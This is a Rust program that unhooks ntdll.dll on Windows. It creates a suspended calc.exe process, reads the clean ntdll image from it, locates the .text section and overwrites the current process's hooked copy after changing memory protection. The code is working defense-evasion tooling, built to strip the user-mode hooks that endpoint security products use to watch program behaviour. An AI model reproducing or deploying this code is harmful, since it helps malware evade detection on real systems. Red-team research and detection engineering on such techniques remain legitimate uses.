use ntapi::{
    ntldr::LDR_DATA_TABLE_ENTRY,
    ntpebteb::PEB,
};
use std::{
    ffi::c_void, 
    ptr::null_mut
};
use windows::{
    core::{PSTR, Result},
    Win32::System::{
        Memory::*,
        Diagnostics::Debug::{
            ReadProcessMemory, 
            IMAGE_NT_HEADERS64, 
            IMAGE_SECTION_HEADER
        }
    },
};

use windows::Win32::System::{
    SystemServices::{
        IMAGE_DOS_HEADER, 
        IMAGE_DOS_SIGNATURE, 
        IMAGE_NT_SIGNATURE
    },
    Threading::{
        CreateProcessA, CREATE_SUSPENDED, 
        PROCESS_INFORMATION, STARTUPINFOA
    },
};

fn main() -> Result<()> {
    unsafe  {
        // Path to the target process to be created in suspended mode
        let process = c"C:\\Windows\\System32\\calc.exe";

        // Retrieve base address of ntdll.dll from current process
        let module = get_ntdll_address();
        
        // Create a new suspended process (calc.exe)
        let si = STARTUPINFOA { cb: size_of::<STARTUPINFOA>() as u32, ..Default::default() };
        let mut pi = PROCESS_INFORMATION::default();
        CreateProcessA(
            None,
            PSTR(process.as_ptr() as *mut u8),
            None,
            None,
            false,
            CREATE_SUSPENDED,
            None,
            None,
            &si,
            &mut pi,
        )?;
        
        // Validate DOS header of ntdll
        let dos_header = module as *mut IMAGE_DOS_HEADER;
        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            eprintln!("[!] INVALID DOS SIGNATURE");
            return Ok(())
        }
    
        // Validate NT header of ntdll
        let nt_header = ((*dos_header).e_lfanew as usize + module as usize) as *mut IMAGE_NT_HEADERS64;
        if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
            eprintln!("[!] INVALID NT SIGNATURE");
            return Ok(())
        }
    
        // Allocate buffer to hold a clean copy of ntdll.dll from the suspended process
        let size_image = (*nt_header).OptionalHeader.SizeOfImage;
        let buffer_ntdll = HeapAlloc(GetProcessHeap()?, HEAP_ZERO_MEMORY, size_image as usize);
        let mut number_bytes = 0;
        ReadProcessMemory(
            pi.hProcess,
            module.cast(),
            buffer_ntdll,
            size_image as usize,
            Some(&mut number_bytes),
        )?;
    
        // Locate the .text section (code section) of ntdll
        let section_header = (nt_header as usize + size_of::<IMAGE_NT_HEADERS64>()) as *mut IMAGE_SECTION_HEADER;
        let mut tmp_nt_local = null_mut();
        let mut tmp_nt_process = null_mut();
        let mut ntdll_txt_size = 0;
        for i in 0..(*nt_header).FileHeader.NumberOfSections {
            let section = (*section_header.add(i.into())).Name;
            let name = std::str::from_utf8(&section)
                .unwrap_or("")
                .trim_matches('\0');
            
            if name == ".text" {
                tmp_nt_local = (module as usize + (*section_header.add(i.into())).VirtualAddress as usize) as *mut c_void;
                tmp_nt_process = (buffer_ntdll as usize + (*section_header.add(i.into())).VirtualAddress as usize) as *mut c_void;
                ntdll_txt_size = (*section_header.add(i.into())).Misc.VirtualSize as usize;
            }
        }
    
        println!("NTDLL HOOKED ADDRESS: {:?}", tmp_nt_local);
        println!("NTDLL UNHOOKED ADDRESS: {:?}", tmp_nt_process);
    
        // Change protection to allow overwriting the hooked .text section
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        VirtualProtect(
            tmp_nt_local, 
            ntdll_txt_size, 
            PAGE_EXECUTE_WRITECOPY,
            &mut old_protect
        )?;
    
        // Overwrite the hooked .text section with the clean one
        std::ptr::copy_nonoverlapping(tmp_nt_process, tmp_nt_local, ntdll_txt_size);
    
        // Restore original protection
        VirtualProtect(
            tmp_nt_local, 
            ntdll_txt_size, 
            old_protect, 
            &mut old_protect
        )?;
    }

    Ok(())
}

/// Retrieves the base address of the `ntdll.dll` module.
///
/// This function accesses the Process Environment Block (PEB) and traverses
/// the loader data structures to locate the base address of `ntdll.dll`.
/// 
/// # Returns
///
/// * A pointer to the base address of the `ntdll.dll` module.
fn get_ntdll_address() -> *mut c_void {
    unsafe {
        let peb = NtCurrentPeb();
        let ldr_data = ((*(*(*peb).Ldr).InMemoryOrderModuleList.Flink).Flink as *const u8)
            .offset(if cfg!(target_arch = "x86_64") { -0x10 } else { -0x08 }) 
            as *const LDR_DATA_TABLE_ENTRY;
        
        (*ldr_data).DllBase.cast::<c_void>()
    }
}

/// Retrieves a pointer to the Process Environment Block (PEB) of the current process.
/// 
/// # Returns
/// 
/// * Pointer to the PEB structure.
#[inline(always)]
#[allow(non_snake_case)]
fn NtCurrentPeb() -> *const PEB {
    unsafe {
        #[cfg(target_arch = "x86_64")]
        return __readgsqword(0x60) as *const PEB;

        #[cfg(target_arch = "x86")]
        return __readfsdword(0x30) as *const PEB;
    }
}

/// Reads a `u64` value from the GS segment at the specified offset.
/// 
/// # Arguments
/// 
/// * `offset` - The offset from the GS base where the value is located.
/// 
/// # Returns
/// 
/// * The value read from the GS segment.
#[inline(always)]
#[cfg(target_arch = "x86_64")]
unsafe fn __readgsqword(offset: u64) -> u64 {
    let out: u64;
    core::arch::asm!(
        "mov {}, gs:[{:e}]",
        lateout(reg) out,
        in(reg) offset,
        options(nostack, pure, readonly),
    );
    out
}

/// Reads a `u32` value from the FS segment at the specified offset.
/// 
/// # Arguments
/// 
/// * `offset` - The offset from the FS base where the value is located.
/// 
/// # Returns
/// 
/// * The value read from the FS segment.
#[inline(always)]
#[cfg(target_arch = "x86")]
unsafe fn __readfsdword(offset: u32) -> u32 {
    let out: u32;
    core::arch::asm!(
        "mov {:e}, fs:[{:e}]",
        lateout(reg) out,
        in(reg) offset,
        options(nostack, pure, readonly),
    );
    out
}